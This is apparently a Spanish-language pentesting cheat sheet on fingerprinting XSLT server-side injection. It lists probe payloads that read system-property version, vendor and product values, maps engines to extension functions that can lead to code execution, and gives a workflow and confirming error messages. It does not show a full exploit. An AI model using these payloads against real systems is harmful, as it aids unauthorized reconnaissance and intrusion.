---
aliases:
  - XSLT Version Detection
  - XSLT Fingerprint
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
---
# XSLT - Fingerprinting

***

## Cheatsheet

| **Objetivo** | **Payload XSLT** | **Info extraída** |
|:---:|:---:|---|
| **Probe XSLT injection** | `<xsl:value-of select="'XSLT-OK'"/>` | Si aparece `XSLT-OK` en response → inyección confirmada. |
| **Versión XSLT soportada** | `<xsl:value-of select="system-property('xsl:version')"/>` | `1.0` / `2.0` / `3.0` → determina qué funciones están disponibles. |
| **Vendor / Engine** | `<xsl:value-of select="system-property('xsl:vendor')"/>` | Saxon / libxslt / Xalan-Java / Microsoft / PHP — decide vector RCE. |
| **Vendor URL** | `<xsl:value-of select="system-property('xsl:vendor-url')"/>` | Info adicional del motor. |
| **Product name (Saxon)** | `<xsl:value-of select="system-property('xsl:product-name')"/>` | Saxon-HE / Saxon-PE / Saxon-EE — features dependen de edition. |
| **Product version** | `<xsl:value-of select="system-property('xsl:product-version')"/>` | Version exacta → CVE lookup. |
| **Current node** | `<xsl:value-of select="generate-id(.)"/>` | ID único del nodo → confirma parse + context. |
| **List available functions** | `<xsl:value-of select="function-available('php:function')"/>` | `true` / `false` — probar por vendor: `php:function`, `java:*`, `saxon:*`. |
^xslt-fingerprinting

___

## Overview

Primer paso en cualquier XSLT injection: determinar **versión y motor**. El subset de funciones disponibles varía enormemente según implementación:

| Motor | Lenguajes/ctx | Versiones | Extension support |
|---|---|---|---|
| **libxslt** | PHP, Python, Ruby, C | XSLT 1.0 (+EXSLT parcial) | Limitado, sin RCE nativo. |
| **Saxon-HE** | Java (Open Source) | XSLT 2.0 / 3.0 | `saxon:*` funciones. |
| **Saxon-PE / EE** | Java (comercial) | XSLT 2.0 / 3.0 | Extension functions, Java reflection. |
| **Xalan-Java** | Java | XSLT 1.0 | `xalan:*` — ejecuta Java estático. |
| **PHP XSLProcessor** | PHP | XSLT 1.0 (libxslt) | `php:function` si habilitado. |
| **Microsoft MSXML** | .NET / COM | 1.0 / 2.0 | `msxsl:script` — embed JScript/VBScript. |

### Workflow de fingerprint

```
1. Probar XSLT injection básico: <xsl:value-of select="'test'"/>
   - Si reflexiona "test" → confirmado.
2. Extraer system-property:
   - xsl:version → 1.0 o 2.0/3.0 (determina vocabulario disponible)
   - xsl:vendor → Saxon / libxslt / Xalan / Microsoft / Apache
   - xsl:product-name + xsl:product-version → CVE search
3. Mapear extensiones: function-available('php:function') etc.
```

### Payloads template

**Inyección en `<xsl:value-of>` context** (el más común):
```xml
<xsl:value-of select="system-property('xsl:version')"/>
```

**Inyección como stylesheet completo** (si el input acepta XSL completo):
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="system-property('xsl:vendor')"/>
    </xsl:template>
</xsl:stylesheet>
```

### Detección del vector

Indicadores de app usando XSLT:
- Endpoint que acepta XML/XSL upload.
- Transformación de feeds RSS/Atom.
- Generación de PDFs desde XML (Apache FOP, etc).
- Dashboards que renderizan reports XML.
- APIs que retornan `Content-Type: application/xml` + transformación.
- Stack Java con librerías XSLT (Spring, Apache projects).

### Errores típicos que confirman XSLT

- `XPathException`, `XsltException`, `XTSE0010`.
- Menciones de `Saxon`, `Xalan`, `libxslt`.
- "Error in XSLT stylesheet".
- Stack traces con `net.sf.saxon.*` / `org.apache.xalan.*`.

***
